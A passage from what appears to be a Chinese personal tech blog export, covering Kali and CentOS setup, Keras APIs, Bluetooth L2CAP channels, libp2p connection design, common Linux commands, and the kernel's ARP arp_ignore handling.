\u0026#34;1920x1080_60.00\u0026#34; 注意：\u0026ldquo;1920x1080_60.00\u0026quot;和Virtual1是在查看得到的数据。 按ESC退出insert模式，输入**:wq**保存，并退出。 4. 重载配置文件： 终端输入下列命令重载配置文件。\n1 ~$ source /etc/profile 修改分辨率： 通过 settings-\u0026gt;displays-\u0026gt;resolution中找到刚才添加的分辨率了，修改分辨率后即可永久修改。 三、修改图标和字体大小 “设置” \u0026ndash;\u0026gt; \u0026ldquo;通用辅助功能\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;大号字体\u0026rdquo; 在终端中输入 “gnome-tweaks” 打开 优化 \u0026ndash;\u0026gt; 扩展 \u0026ndash;\u0026gt; dash to dock \u0026ndash;\u0026gt; 点击齿轮按钮，可以设置图标大小， gnome-tweaks 中可设置字体大小 四、更新换源 因为kali是国外的，所以一些软件你要下载的话得从国外的网站下载，就会很慢。国内一些公司或者学校提供了国内的下载地址，通过国内下载的话速度将会大大提高，所以我们需要更换更新源。\n终端输入： 1 leafpad /etc/apt/sources.list 换源： 1 2 3 4 5 6 7 8 9 10 11 #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 重载： 1 apt-get clean \u0026amp;\u0026amp; apt-get update \u0026amp;\u0026amp; apt-get upgrade -y \u0026amp;\u0026amp; apt-get dist-upgrade -y 命令讲解：\n1 2 3 4 apt-get clean //清除缓存索引 apt-get update //更新索引文件 apt-get upgrade //更新实际的软件包文件 apt-get dist-upgrade //根据依赖关系更新 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/kali%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"Kali配置（虚拟机）"},{"content":"Kali 执行 apt-get upgrade 后无法打开终端 一、问题详情 安装完Kali虚拟机后，执行apt-get upgrade更新，更新完成后reboot重启，发现无法打开终端。\n二、问题原因 由于最开始安装kali的时候是选择中文，在upgrade后，系统把语言设置回了英文，因而在终端因为乱码而无法打开。\n三、解决方案 我们重新设置一下语言即可解决问题：\n进入命令行界面： Alt+Ctrl +F6 依次输入： 1 2 3 4 5 apt-get install --reinstall locales # 将语言集设置成英文 export LANGUAGE=\u0026#34;en_US.UTF-8\u0026#34; echo \u0026#39;LANGUAGE=\u0026#34;en_US.UTF-8\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/default/locale echo \u0026#39;LC_ALL=\u0026#34;en_US.UTF-8\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/default/locale 重启： 1 reboot 重新设置语言： 在设置中将语言调整为中文 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/kali%E6%89%A7%E8%A1%8Capt-get-upgrade%E5%90%8E%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%BB%88%E7%AB%AF/","title":"Kali执行apt-get upgrade后无法打开终端"},{"content":"Keras 中 model.evaluate 和 model.predict 的区别 mode.evaluate 官方声明：传送门\n输入参数：\n1 evaluate(x=None, y=None, batch_size=None, verbose=1, sample_weight=None, steps=None, callbacks=None, max_queue_size=10, workers=1, use_multiprocessing=False) x：输入数据 y：输入标签 batch_size：批次大小 verbose：0不显示进度条，1为显示进度条 sample_weight：测试样本的可选Numpy权重数组，用于对损失函数加权 steps：样本批次 callbacks：评估期间需要应用的回调列表 max_queue_size：生成器队列的最大大小 workers：执行期间使用的进程数 use_multiprocessing：如果为True，则使用基于进程的线程 返回值：\n损失值：网络在训练数据上的损失（预测值和实际值之间的差距），该值和编译模型时选择的损失有关 精度：准确率（成功数量与总数据量的比值） 返回格式：['loss', 'accuracy'] 可以通过打印 model.metrics_names 来查看\nmode.predict 官方文档：传送门\n输入参数：\n1 predict(x, batch_size=None, verbose=0, steps=None, callbacks=None, max_queue_size=10, workers=1, use_multiprocessing=False) x：输入数据 others：同上 返回值：\n输出输入数据的预测结果，需要自己手动比较 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/keras-%E4%B8%AD-model.evaluate-%E5%92%8C-model.predict-%E7%9A%84%E5%8C%BA%E5%88%AB/","title":"Keras 中 model.evaluate 和 model.predict 的区别"},{"content":"L2CAP COC 调研 iOS提供了两种蓝牙通讯方式：GATT 和 L2CAP Channels。L2CAP Channels 适合传输大数据的流式的，GATT 只能一次取出单个数据。\n712_whats_new_in_core_bluetooth.pdf （WWDC17 - What’s New in Core Bluetooth）\n注：L2CAP Channels 全称应该是 L2CAP Connection-Oriented Channel，一般缩写为 L2CAP CoC。这是一项 BR/EDR（Bluetooth Classic）上的特性，蓝牙4.1版本在 LE (Low Energy) 中支持了这个特性。单独的 L2CAP (Logical Link Control and Adaptation Protocol) 一词是指底层的链路层协议，而不是 Channel 。BLE上除了CID 5处理Advertising是Connectionless以外，其余的Channel都是Connction-Oriented。在BLE上，ATT使用CID 4。\nL2CAP is packet-based but follows a communication model based on channels. A channel represents a data flow between L2CAP entities in remote devices. Channels may be connection-oriented or connectionless. All channels other than the L2CAP connectionless channel (CID 0x0002) and the two L2CAP signaling channels (CIDs 0x0001 and 0x0005) are connection-oriented.\nHost 通过 HCI_Set_Connection_Encryption 告诉 LM 需要加密，双方 LM 通过 LMP_encryption_mode_req 协商是否启用加密。当后续连接建立时，将触发配对。\nHost 通过 HCI_Set_Connection_Encryption 告诉 LM 需要加密，双方 LM 通过 LMP_encryption_mode_req 协商是否启用加密。当后续连接建立时，将触发配对。\niOS 扫描：\niOS 通过 CoreBluetooth 框架进行扫描到的所有蓝牙设备都是在进行 BLE 广播的设备。\nCoreBluetooth 扫描到的设备都会有一个 UUID，这个 UUID 是基于设备 MAC + 时间戳生成，和 Android 上直接扫描到设备的 MAC 不同。\n1 func scanForPeripherals(withServices serviceUUIDs: [CBUUID]?,options: [String : Any]? = nil) 监听：\n1 2 // CBPeripheralManager func publishL2CAPChannel(withEncryption encryptionRequired: Bool) publishL2CAPChannel(withEncryption:) | Apple Developer Documentation\n连接：\n1 2 // CBPeripheral func openL2CAPChannel(_ PSM: CBL2CAPPSM) CBPeripheralManager | Apple Developer Documentation\n以上API，iOS11 支持。\nAndroid 监听：\n1 2 3 // BluetoothAdapter public BluetoothServerSocket listenUsingInsecureL2capChannel () public BluetoothServerSocket listenUsingL2capChannel () BluetoothAdapter | Android Developers\n连接：\nBluetoothDevice public BluetoothSocket createInsecureL2capChannel (int psm) public BluetoothSocket createL2capChannel (int psm) BluetoothDevice | Android Developers\n以上API，API Level 29 支持。\nLinux Linux 上 bluez 服务对底层接口进行了封装，bluez 提供了 DBus 接口对蓝牙服务进行管理，bluez 相关 DBus 接口文档地址：https://github.com/bluez/bluez/tree/master/doc\n通过 bluez 进行 BLE 广播：https://github.com/bluez/bluez/blob/master/test/example-advertisement\n使用 bluez 提供 GATT server：https://github.com/bluez/bluez/blob/master/test/example-gatt-server\n使用 bluez 提供 L2CAP COC server （官方尚未实现）：Proper way to create Custom LE Profile using LE COC over Bluez DBUS API · Issue #183 · bluez/bluez · GitHub\n使用 bluer-tools 提供的 l2cat 命令实现 L2CAP COC server：https://github.com/bluez/bluer/blob/master/bluer-tools/src/l2cat.rs\n具体内部实现逻辑需要查看对应的 Rust 源码\n待调研 跨系统连接 Q: iOS / Android 是否能连接上 Linux 监听的 L2CAP Channel ？\n注：Berty 使用了未加密的 Channel，在 Android 和 iOS 之间应该是可连通的。\nGitHub - berty/berty: Berty is a secure peer-to-peer messaging app that works with or without internet access, cellular data or trust in the network\nA: 使用非安全通道可以进行联通，安全通道尚未进行尝试。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/l2cap-coc-%E8%B0%83%E7%A0%94/","title":"L2CAP COC 调研"},{"content":"leetcode 刷题笔记 滑动窗口 1. 定长滑动窗口 套路：\n入：下标为 i 的元素进入窗口，更新相关统计量。如果 i\u0026lt;k−1 则重复第一步。 更新：更新答案。一般是更新最大值/最小值。 出：下标为 i−k+1 的元素离开窗口，更新相关统计量。 题单：https://huxulm.github.io/lc-rating/list/slide_window#-1177929655\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/lc-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/","title":"lc 刷题笔记"},{"content":"libp2p peer ID 识别流程 peer ID 的识别主要是在不安全的连接升级到安全连接阶段完成，peer ID 都是通过连接升级阶段传递公钥获取的。\nlibp2p 当前支持两种安全连接，Noise 和 TLS。\n对于 Noise 连接，公钥通过和 Noise 握手数据一起传输时发送到服务端，服务端提取到公钥后再转换为 peer ID。\n对于 TLS 连接，利用 TLS 的 ExtraExtensions 字段携带公钥，服务端从 ExtraExtensions 提取出公钥再转换出客户端 peer ID。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/libp2p-peer-id-%E8%AF%86%E5%88%AB%E6%B5%81%E7%A8%8B/","title":"libp2p peer ID 识别流程"},{"content":"整体结构 libp2p 模块的整体结构如上图所示：\n**一个 libp2p 节点可以同时与多个节点建立连接：**如 peer A、peer B等。 **每个节点可以同时存在多个连接：**如与 peer A 同时建立了 QUIC 连接 A、TCP 连接 B、Relay 连接C，与 peer B 同时建立了 TCP 连接 A、TCP 连接 B、Relay 连接C。 **每个连接下可以存在多个 Stream：**如 peer A 的 QUIC 连接 A 下面有 stream1、stream2、stream3 等。 Stream 创建过程 **Stream 是 libp2p 传输数据的通道。**想要通过使用 libp2p 与对端传输数据，则必须要创建一个到对端的流，通过流进行数据传输。\n下图展示了 libp2p 中创建 stream 的主要逻辑：\n下面对流创建过程中的重要步骤进行详细讲解。\n选择连接 当需要创建流时，本地 libp2p 节点到 peer A 可能有多个可用连接，libp2p 需要从众多连接中挑选出一个连接。\nlibp2p 默认的连接排序逻辑为：\n先建立的连接 \u0026gt; 后建立的连接； 直连连接 \u0026gt; 中继连接； 当前打开 Stream 数量较多的连接 \u0026gt; 当前打开 Stream 数量较少的连接。 由于 libp2p 的连接选择逻辑较为简单，因此我们对连接排序逻辑进行了部分优化：\n先建立的连接 \u0026gt; 后建立的连接； Private IP 连接 \u0026gt; Public IP 连接 \u0026gt; 中继连接； QUIC \u0026gt; WebTransport \u0026gt; WebRTC \u0026gt; TCP \u0026gt; WebSocket； 当前打开 Stream 数量较多的连接 \u0026gt; 当前打开 Stream 数量较少的连接。 由于固定逻辑的排序选择无法适应复杂的网络环境，因此将连接排序函数设置为可自定义，后续可由外层做基于更多指标的连接排序，如连接带宽、丢包率等。\n建立连接 当本地到对端节点没有可用连接时，libp2p 需要根据地址列表尝试建立连接。\n在建立连接时，由于到 peer A 有多个可能地址，libp2p 需要对这些地址都进行尝试，直到建立一个可用连接或者全部失败。\n在尝试 peer A 的地址列表时，libp2p 首先会对地址列表进行排序.\nlibp2p 默认的地址排序逻辑为:\nPrivate IP 地址 \u0026gt; Public IP 地址 \u0026gt; 中继连接地址； WebRTC \u0026gt; QUIC IPv6 \u0026gt; QUIC IPv4 \u0026gt; WebTransport IPv6 \u0026gt; WebTransport IPv4 \u0026gt; TCP IPv6 \u0026gt; TCP IPv4。 对连接地址进行排序后，libp2p 会对所有的地址依次进行连接。但是 libp2p 不会等到连接结果返回再连接下一个。在尝试一个连接后，如果一定延时内（毫秒级别）没有结果返回的话，libp2p 会立即尝试下一个地址。\n当有任意一个地址连接成功后，libp2p 会立即返回当前连接，但是不会终止整个连接过程。直到整个地址列表尝试完成才会终止连接过程。\n触发打洞 libp2p 的打洞是由连接事件驱动。\n当成功建立一个连接时，libp2p 会在整个节点内部广播这个事件。libp2p 的打洞模块便会监听该事件。\n打洞模块在收到一个连接建立事件后，会对该事件进行判断：\n自身是连接的服务端？ 该连接是 Relay 连接？ 如果满足以上条件，libp2p 会启动打洞逻辑，尝试与该连接所属节点尝试进行打洞。\nlibp2p 的默认打洞逻辑仅会在连接建立成功那一刻触发，触发之后如果打洞失败，后续不会再进行尝试。对于运行在 PC 端的 libp2p 来说该逻辑是足够的，因为大部分 PC 端的网络环境不会轻易变化。\n但是对于移动端场景来说是不够的，因为移动端网络变化较为频繁。因此对于打洞模块的触发逻辑需要进行优化：\n新增打洞重试事件，当打洞模块监听到该事件后，需要重新对指定节点尝试重新打洞； 对本机网络进行监听，当本机网络发生改变时触发打洞重试事件； 启用定时器，定期对打洞失败的节点尝试重新打洞。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/libp2p-%E8%BF%9E%E6%8E%A5%E8%AF%A6%E8%A7%A3/","title":"libp2p 连接详解"},{"content":"一、使用 1.1 网络可见性 libp2p 节点在默认情况下，其节点的网络可见性由 AutoNAT 模块和其他节点交互而自动确定。但是 AutoNAT 存在发现时间确认网络可见性时间较长，且需要和较多节点交互的缺点。\n对于设备端、移动端和云端中继节点，网络可见性是预知的，因此需要预设节点网络可见性：\n设备端、移动端：设备端和移动端节点默认是工作在 NAT 之后的，预设其网络可见性为 private； 云端中继：云端中继节点是具有公网 IP 的，需要预设其网络可见性为 public。 1.2 手动配置地址 默认情况下，libp2p 节点的地址列表由本地监听地址列表、NAT 映射地址、节点连接中继地址和 AutoNAT 发现地址组成。其中 AutoNAT 发现地址是通过和其他节点交互而确定的（主要是用于发现 NAT 映射地址，类似于传统 NAT 穿透中与 STUN 服务器交互发现 NAT 映射地址）。\n但是 AutoNAT 存在发现时间确认网络可见性时间较长，且需要和较多节点交互的缺点，会导致节点无法第一时间探测到自身外部地址。并且 AutoNAT 发现的地址皆为 IP 形式，无法发现域名形式的地址。\n通过在地址列表中增加手动配置地址的方式可以解决 AutoNAT 存在的问题。\n云端中继：手动配置节点公网地址； 设备端：手动配置节点外部节点能力作为可选项配置。 1.3 取消中继节点资源限制 libp2p 节点在启用 Relay 能力时，默认情况下会存在资源限制：source code。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // DefaultResources returns a Resources object with the default filled in. func DefaultResources() Resources { return Resources{ Limit: DefaultLimit(), ReservationTTL: time.Hour, MaxReservations: 128, MaxCircuits: 16, BufferSize: 2048, MaxReservationsPerPeer: 4, MaxReservationsPerIP: 8, MaxReservationsPerASN: 32, } } // DefaultLimit returns a RelayLimit object with the defaults filled in. func DefaultLimit() *RelayLimit { return \u0026amp;RelayLimit{ Duration: 2 * time.Minute, Data: 1 \u0026lt;\u0026lt; 17, // 128K } } 对于我们的公网中继节点来说，需要取消该限制才能让上层业务正常使用。\n1.4 启用 NATPortMap NATPortMap 用于在路由器上通过 PCP / NAT-PMP / UPnP 协议进行端口映射。默认情况下，libp2p 未启用 NATPortMap 能力。为了提高打洞成功率，对于设备端默认启用 NATPortMap 能力。\n1.5 启用 mDNS mDNS 用于在局域网发现 libp2p 节点。默认情况下 libp2p 未启用 mDNS 能力。为了方便快速发现局域网中 libp2p 节点信息，对于设备端和移动端默认启用 mDNS 能力。\n二、相关改进 2.1 holepunch libp2p 的 holepunch 模块只是实现了相对基础的 P2P 能力，对于带有具有防护能力的路由器 和 Port Restricted Cone NAT - Symmetric NAT 的打洞能力不足。\n根据调查发现带有具有防护能力的路由器在国内家用环境较为常见。因此对 libp2p holepunch 模块进行了优化，在 libp2p 的 holepunch 打洞阶段结束且打洞失败后，尝试进行高级打洞。流程如下图所示：\n2.2 中继选择与切换 由于 libp2p 原生 AutoRelay 模块选择逻辑过于简单，不符合实际需求。因此需要自行实现中继选择逻辑，再通过实例传递的方式覆盖原有中继选择模块。\n2.3 地址解析服务 libp2p 原生提供从 mDNS 解析地址和 DHT 解析地址。由于 IPFS 节点大部分在国外，国内用户通过访问 IPFS 速度较慢。因此需要在国内需要提供查询优化服务。\n2.4 移动端适配优化 由于手机操作系统对于 APP 后台管理策略较为严格，因此 libp2p 在手机端运行时遇到了底层 socket 被销毁问题。\n2.5 mDNS domain 替换 libp2p 默认是采用一个由 32 ~ 64 字符长度的随机字符串作为 mDNS doamin：source code。\n为了实现通过 \u0026lt;peer id\u0026gt;.local 的方式能够直接访问到主机（mDNS标准用法），需要用 peer id 替换该随机字符串。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/libp2p-%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%94%B9%E8%BF%9B/","title":"libp2p 使用与改进"},{"content":"Linux 常用命令 1. 修改用户名和密码 1 2 3 4 5 # 修改用户名 usermod -l new old # 修改密码 passwd 2. 查找文件 1 find \u0026lt;指定目录\u0026gt; \u0026lt;指定条件\u0026gt; \u0026lt;指定动作\u0026gt; 3. 统计文件夹下文件数量 Linux下有三个命令：ls、grep、wc。通过这三个命令的组合可以统计目录下文件及文件夹的个数。\n统计当前目录下文件的个数（不包括目录） 1 $ ls -l | grep \u0026#34;^-\u0026#34; | wc -l 统计当前目录下文件的个数（包括子目录） 1 $ ls -lR| grep \u0026#34;^-\u0026#34; | wc -l 查看某目录下文件夹(目录)的个数（包括子目录） 1 $ ls -lR | grep \u0026#34;^d\u0026#34; | wc -l 命令解析：\nls -l 长列表输出该目录下文件信息(注意这里的文件是指目录、链接、设备文件等)，每一行对应一个文件或目录，ls -lR是列出所有文件，包括子目录。\ngrep \u0026quot;^-\u0026quot; 过滤ls的输出信息，只保留一般文件，只保留目录是grep \u0026quot;^d\u0026quot;。 wc -l 统计输出信息的行数，统计结果就是输出信息的行数，一行信息对应一个文件，所以就是文件的个数。 4. HTTP 压测 编译安装 wrk：\n1 2 3 4 5 6 # 克隆到本地 git clone https://github.com/wg/wrk # 进入wrk cd wrk # 编译 make 对 百度 进行压测：\n1 2 -- 表示采用了10个线程,连接数300,持续时间20s ./wrk -t10 -c300 -d20s --latency http://www.baidu.com 5. 关机重启 1 2 3 4 5 6 7 8 9 10 11 12 # 立即关机 shutdown -h now init 0 # graceful # 定时关机 shutdown -h 23:30 # 23:30 关机 shutdown -h +15 # 15分钟后关机 # 重启 shutdown -r now reboot init 6 # graceful 6. WiFi 和 蓝牙 电源管理 1 2 3 4 # 关闭 rfkill block wifi # 关闭 wifi 设备 # 开启 rfkill unblock wifi # 开启 wifi 设备 7. 网络测速 apt install iperf3 参数：\n（1）-s,\u0026ndash;server：iperf服务器模式，默认启动的监听端口为5201，eg：iperf -s\n（2）-c,\u0026ndash;client host：iperf客户端模式，host是server端地址，eg：iperf -c 222.35.11.23\n（3）-i，\u0026ndash;interval：指定每次报告之间的时间间隔，单位为秒，eg：iperf3 -c 192.168.12.168 -i 2\n（4）-p，\u0026ndash;port：指定服务器端监听的端口或客户端所连接的端口，默认是5001端口。\n（5）-u，\u0026ndash;udp：表示采用UDP协议发送报文，不带该参数表示采用TCP协议。\n（6）-l，\u0026ndash;len：设置读写缓冲区的长度，单位为 Byte。TCP方式默认为8KB，UDP方式默认为1470字节。通常测试 PPS 的时候该值为16，测试BPS时该值为1400。\n（7）-b，\u0026ndash;bandwidth [K|M|G]：指定UDP模式使用的带宽，单位bits/sec，默认值是1 Mbit/sec。\n（8）-t，\u0026ndash;time：指定数据传输的总时间，即在指定的时间内，重复发送指定长度的数据包。默认10秒。\n（9）-A：CPU亲和性，可以将具体的iperf3进程绑定对应编号的逻辑CPU，避免iperf进程在不同的CPU间调度。\n8. 查看系统路由表 1 ip route list table 0 9. 查询主机外部 IP 1 curl -L ip.tool.lu 10. 网卡速率 1 watch -n 1 ifconfig lo 通过比较 RX 和 TX 计算得出：\nEvery 1.0s: ifconfig lo Tue Dec 12 10:54:50 2023 lo Link encap:UNSPEC inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope: Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:46618912 errors:0 dropped:0 overruns:0 frame:0 TX packets:46618912 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:54983068842 TX bytes:54983068842 11. 查看端口占用 1 2 3 4 5 ss -ntlp | grep \u0026lt;port\u0026gt; netstat -ntlp | grep \u0026lt;port\u0026gt; lsof -i:\u0026lt;port\u0026gt; 12. 查看最后一个文件 1 ls -l | awk \u0026#39;{print $NF}\u0026#39; | tail -n 1 | xargs tail -f 13. 查询指定文件夹下包含指定内容的文件 1 grep -r \u0026#34;关键词\u0026#34; /path/dir 14. 通过代理执行 ssh 和 scp 1 2 3 ORIGINAL_HOST=\u0026#34;baidu.com\u0026#34; ssh -o ProxyCommand=\u0026#39;nc -X 5 -x {ProxyAddr} $ORIGINAL_HOST %p\u0026#39; \u0026#34;root@$ORIGINAL_HOST\u0026#34; ORIGINAL_HOST=\u0026#34;baidu.com\u0026#34; scp -o ProxyCommand=\u0026#39;nc -X 5 -x {ProxyAddr} $ORIGINAL_HOST %p\u0026#39; \u0026#34;root@$ORIGINAL_HOST:/path/to/remote/file\u0026#34; /path/to/local/destination 15. 查看本地 NAT 转换规则 1 2 3 4 5 # 查看 iptables 中的 NAT 规则 iptables -t nat -vL # 查看连接跟踪表 nf_conntrack cat /proc/net/nf_conntrack ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","title":"Linux 常用命令"},{"content":"Centos minimal 网络配置 一、下载 \u0026amp;\u0026amp; 安装 版本选择：Centos 7.9 minimal\n下载地址：Index of /centos/7.9.2009/isos/x86_64/ (aliyun.com)\n安装：这里自己选择 VM 进行安装（安装过程这里就不赘述了）\n二、Centos 网络配置相关文件 1. /etc/resolv.conf 它是 DNS 客户机配置文件，用于设置DNS服务器的IP地址及DNS域名，同时还包含了主机的域名搜索顺序。该文件是由域名解析器（resolver，一个根据主机名解析IP地址的库）使用的配置文件。\nresolv.conf 的关键字主要有四个，分别是：\nnameserver：定义DNS服务器的IP地址 domain：定义本地域名 search：定义域名的搜索列表 sortlist：对返回的域名进行排序 2. /etc/hosts hosts 文件是 Linux 系统中负责 IP 地址与域名快速解析的文件。\nhosts 文件包含了 IP 地址和主机名之间的映射，包括主机名的别名。在没有域名服务器的情况下，系统上的所有网络程序都通过查询该文件来解析对应于某个主机名的ip地址，否则就需要使用DNS服务程序来解决。\n优先级：DNS 缓存 \u0026gt; hosts \u0026gt; DNS 服务\n3. /etc/sysconfig/network 该文件可用于设定本机主机名，：\n1 2 NETWORKING=yes # 网络是否可用 HOSTNAME=minimal # 主机名 4. /etc/sysconfig/network-script/ifcfg-\u0026lt;interface-name\u0026gt; 这是每一个网络接口的配置信息。每一个网卡只能使用一个配置文件，当有多个配置文件时，后面读取的配置文件信息会覆盖前面的配置信息。\n三、查看本机网卡信息 由于 Centos 最小化安装后是没有 ifconfig 命令的，因此没有办法通过 ifconfig 查看网卡相关配置信息的。\n这个时候我们需要通过 ip 命令来查看网卡信息。\nip addr 或 ip addr show 在输出内容中我们可以发现两块网卡：lo 和 ens33。\nlo表示local，lo 网卡是用于回环地址的网卡，并不是真正有这样的物理网卡，它的地址一般是127.0.0.1，回环地址一般是用于网络程序开发、网络组件测试时会用到。\n新版的 CentOS 7 开始对于网卡的编号有另外一套规则，网卡的代号与网卡的来源有关\neno1：代表由主板 bios 内置的网卡； ens1:代表有主板 bios 内置的 PCI-E 网卡； enp2s0: PCI-E 独立网卡； eth0：如果以上都不使用，则回到默认的网卡名。 ens33 则属于第二种类型，是一块 PCI-E 网卡。当前系统的 ens33 网卡并没有 ipv4 及 ipv6，因此当前 Linux 系统是没有办法上网的。\n四、配置双网卡 1. 添加网卡 在上面我们发现我们的 Linux 只有一张网卡，想要配置双网卡的话需要在虚拟机设置里再添加一张网卡： 添加好后重启进入系统就可以发现我们已经有了两张网卡了（ens33 和 ens36）： 2. 配置 DHCP 查看 ens33 的配置信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [root@localhost ~]# cat /etc/sysconfig/network-scripts/ifcfg-ens33 TYPE=Ethernet # 网卡类型：为以太网 PROXY_METHOD=none # 代理方式：关闭状态 BROWSER_ONLY=no # 只是浏览器：否 BOOTPROTO=dhcp # 网卡的引导协议：DHCP[中文名称: 动态主机配置协议] DEFROUTE=yes # 默认路由：是, 不明白的可以百度关键词 `默认路由` IPV4_FAILURE_FATAL=no # 是不开启IPV4致命错误检测：否 IPV6INIT=yes # IPV6是否自动初始化: 是[不会有任何影响, 现在还没用到IPV6] IPV6_AUTOCONF=yes # IPV6是否自动配置：是[不会有任何影响, 现在还没用到IPV6] IPV6_DEFROUTE=yes # IPV6是否可以为默认路由：是[不会有任何影响, 现在还没用到IPV6] IPV6_FAILURE_FATAL=no # 是不开启IPV6致命错误检测：否 IPV6_ADDR_GEN_MODE=stable-privacy # IPV6地址生成模型：stable-privacy [这只一种生成IPV6的策略] NAME=en3 # 网络接口名称，即配置文件名后半部分。 UUID=f47bde51-fa78-4f79-b68f-d5dd90cfc698 # 通用唯一识别码,每一个网卡都会有,不能重复,否两台linux只有一台网卡可用 DEVICE=ens33 # 网卡设备名称 ONBOOT=no # 是否开机启动，要想网卡开机就启动或通过 `systemctl restart network`控制网卡,必须设置为 `yes` 我们将 ens33 网卡配置为开机启动、动态获取 IP 方式，编辑 ifcfg-ens33 文件，修改以下几项：\n1 2 3 ONBOOT=yes #设置为开机启动 BOOTPROTO=dhcp # 网卡的引导协议：DHCP[动态主机配置协议] DEVICE=ens33 # 要配置的网卡名 修改完成后重启网络服务：\n1 2 3 systemctl restart network # 或 service network restart 此时再查看，可以发现 ens33 已经获取到 IP 地址了： 3. 配置静态地址 由于我们是在系统安装完成之后再添加的网卡，因此在 /etc/sysconfig/network-scripts/目录下会找不到 ifcfg-ens36 配置文件，因此这时我们需要先将 ifcfg-ens33 的文件拷贝一份，重命名为ifcfg-ens36，再进行网卡配置。\n我们将 ens36 网卡配置为开机启动、设置静态 IP 方式，编辑 ifcfg-ens36 文件，修改以下几项：\n1 2 3 4 5 6 DEVICE=ens36\t# 要配置的网卡 ONBOOT=yes # 开机自启动 BOOTPROTO=static\t# 静态ip方式 IPADDR=192.168.153.134 # ipv4地址 GATEWAY0=192.168.153.2 # 设置网关 DNS1=255.5.5.5\t# 设置DNS 配置完成后重启网络服务即可。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/linux-%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/","title":"Linux 网络配置"},{"content":"Linux 下 arp_ignore 问题 问题描述 在 Linux 主机本地新建一张虚拟网卡（如 TUN、TAP、Bridge等），给主机加上 IP 地址（假设为192.168.123.5）。同一局域网内主机添加相应路由表，执行 ping 192.168.123.5 的操作，经过实验发现外部主机能够 ping 通 192.168.123.5。\n即使网卡没有启动，依然可以 ping 通。\n问题分析 经过测试，发现有以下几个特征：\n对执行 ping 的局域网主机进行抓包，发现局域网主机发起 ARP 请求时，Linux 主机回复了 ARP 包，回复的 mac 地址是物理网卡真实的 mac 地址； 多次实验发现，只要 Linux 主机上任意网卡配置了相应 IP，不管对应的网卡有没有开启，局域网主机都可以 ping 通（局域网主机添加了相应路由规则）； 在 Windows 主机上新建虚拟网卡，执行上面的操作，发现无法 ping 通。 根据分析猜测应该是 Linux 对 ARP 包的处理逻辑有一些特性。\nLinux 源码分析 为了更好的了解这个问题，遂决定去看一下 Linux 的内核代码。看的是 Linux 3.10 的代码，源码地址：https://elixir.bootlin.com/linux/v3.10/source\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // net/ipv4/arp.c static int arp_process(struct sk_buff *skb) { ... /* Special case: IPv4 duplicate address detection packet (RFC2131) */ if (sip == 0) { // 判断是不是 arp 请求 if (arp-\u0026gt;ar_op == htons(ARPOP_REQUEST) \u0026amp;\u0026amp; // 判断是不是本地地址 inet_addr_type(net, tip) == RTN_LOCAL \u0026amp;\u0026amp; // 判断是否开启 arp_ignore !arp_ignore(in_dev, sip, tip)) arp_send(ARPOP_REPLY, ETH_P_ARP, sip, dev, tip, sha, dev-\u0026gt;dev_addr, sha); goto out; } ... } 查看路由表：\n1 2 3 4 root@ubuntu:~# ip r show table 0 ... local 192.168.123.5 dev br0 table local proto kernel scope host src 192.168.123.5 ... 192.168.123.5 就是一个本地地址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 static int arp_ignore(struct in_device *in_dev, __be32 sip, __be32 tip) { int scope; switch (IN_DEV_ARP_IGNORE(in_dev)) { case 0:\t/* Reply, the tip is already validated */ return 0; case 1:\t/* Reply only if tip is configured on the incoming interface */ sip = 0; scope = RT_SCOPE_HOST; break; case 2:\t/* * Reply only if tip is configured on the incoming interface * and is in same subnet as sip */ scope = RT_SCOPE_HOST; break; case 3:\t/* Do not reply for scope host addresses */ sip = 0; scope = RT_SCOPE_LINK; break; case 4:\t/* Reserved */ case 5: case 6: case 7: return 0; case 8:\t/* Do not reply */ return 1; default: return 0; } return !inet_confirm_addr(in_dev, sip, tip, scope); } 查询内核的 arp_ignore参数:\n1 2 root@ubuntu:~# cat /proc/sys/net/ipv4/conf/all/arp_ignore 0 发现内核的 arp_ignore 参数为 0，那么代表着 Linux 会回复这个包。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // net/ipv4/arp.c static int arp_process(struct sk_buff *skb) { ... /* Special case: IPv4 duplicate address detection packet (RFC2131) */ if (sip == 0) { // 判断是不是 arp 请求 if (arp-\u0026gt;ar_op == 